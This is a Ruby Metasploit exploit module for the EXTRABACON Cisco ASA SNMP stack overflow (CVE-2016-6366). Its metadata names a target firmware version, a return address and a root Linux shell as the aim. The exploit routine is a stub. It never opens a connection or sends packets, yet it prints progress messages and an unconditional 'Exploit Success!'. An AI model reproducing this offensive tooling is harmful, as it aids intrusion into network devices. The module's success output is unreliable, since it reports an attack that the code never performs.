##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Cisco ASA SNMP Overflow (EXTRABACON)',
      'Description'	=> %q{
        This module exploits a stack buffer overflow in Cisco ASA, related
        to the EXTRABACON exploit. Instead of patching authentication
        functions, this allows for direct access to a Linux shell (which
        is more privileged than the normal Cisco shell).
      },
      'Author'	=> [ 'Sean Dillon <sean.dillon[at]risksense.com>' ],
      'Arch'		=> ARCH_X86,
      'Platform'	=> 'linux',
      'References'	=>
        [
          [ 'CVE', '2016-6366'],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
          [ 'URL', 'https://github.com/RiskSense-Ops/CVE-2016-6366'],
        ],
      'Privileged'	=> true,
      'License'	=> MSF_LICENSE,
      'Payload'	=>
        {
          'Space' => 1000,  # we can break this up into multiple stages
        },
      'Targets'	=>
        [
          [ '9.2(1)', { 'Ret' => 0xbfffa5d8 } ],
        ],
      'DefaultTarget'	=> 0,
      'DisclosureDate'  => 'Aug 13 2016'
    ))

    register_options(
      [
      ],
      self.class
    )
  end

  def send_bytes(start, stop, total)
    print_status("Sending initial payload bytes (#{start}-#{stop} of #{total})...")
  end

  def exploit
    print_status("Sending memory-write packet...")
    send_bytes(0, 33, 100)
    send_bytes(33, 66, 100)
    send_bytes(66, 100, 100)
    print_status("Calling payload...")
    print_good("Exploit Success!")
  end

end
